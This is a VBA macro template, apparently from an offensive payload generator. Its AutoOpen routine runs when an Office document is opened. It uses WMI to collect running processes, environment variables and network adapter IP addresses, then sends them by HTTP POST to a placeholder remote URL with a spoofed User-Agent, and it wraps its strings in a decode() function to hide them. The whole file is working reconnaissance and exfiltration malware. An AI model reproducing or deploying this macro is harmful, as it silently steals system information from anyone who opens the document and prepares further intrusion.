[use:env_query]
[use:process_list]
[use:env_list]
[use:network_list]


Sub AutoOpen()
	env_query
End Sub

Function env_query() As String
	Dim env_query1 As String
	Set env_query2 = CreateObject(decode("{[MSXML2.ServerXMLHTTP]}"))
	env_query1 = process_list()
	env_query1 = env_query1 & Chr(10) & env_list()
	env_query1 = env_query1 & Chr(10) & network_list()
	decode(env_query1)
	var1 = decode("[URL]")
	env_query2.Open decode("{[POST]}"), var1, False
	env_query2.setRequestHeader decode("{[User-Agent]}"), decode("{[Mozilla/4.0 (compatible; Recon MSIE 6.0; Windows NT 5.0)]}")
	env_query2.send(env_query1)
End Function

Function process_list() As String
    On Error Resume Next
    Dim process_list1 As Object
    Dim process_list2 As Object
    Dim process_list4 As String
    Set process_list1 = GetObject(decode("{[winmgmts:\\.\root\cimv2]}"))
    Set process_list2 = process_list1.ExecQuery(decode("{[SELECT Name FROM Win32_Process]}"))
    For Each process_list3 In process_list2
        process_list4 = process_list4 & "," & process_list3.Name
    Next
    process_list = process_list4
End Function

Function env_list() As String
    On Error Resume Next
    Dim env_list1 As Object
    Dim env_list2 As Object
    Dim env_list4 As String
    Set env_list1 = GetObject(decode("{[winmgmts:\\.\root\cimv2]}"))
    Set env_list2 = env_list1.ExecQuery(decode("{[SELECT Name, VariableValue FROM Win32_Environment]}"))
    For Each env_list3 In env_list2
        env_list4 = env_list4 & "," & env_list3.Name & "=" & env_list3.VariableValue
    Next
    env_list = env_list4
End Function

Function network_list() As String
    On Error Resume Next
    Dim network_list1 As Object
    Dim network_list2 As Object
    Dim network_list4 As String
    Set network_list1 = GetObject(decode("{[winmgmts:\\.\root\cimv2]}"))
    Set network_list2 = network_list1.ExecQuery(decode("{[SELECT IPAddress, Description FROM Win32_NetworkAdapterConfiguration]}"))
    For Each network_list3 In network_list2
        network_list4 = network_list4 & "," & network_list3.IPAddress & "=" & network_list3.Description
    Next
    network_list = network_list4
End Function
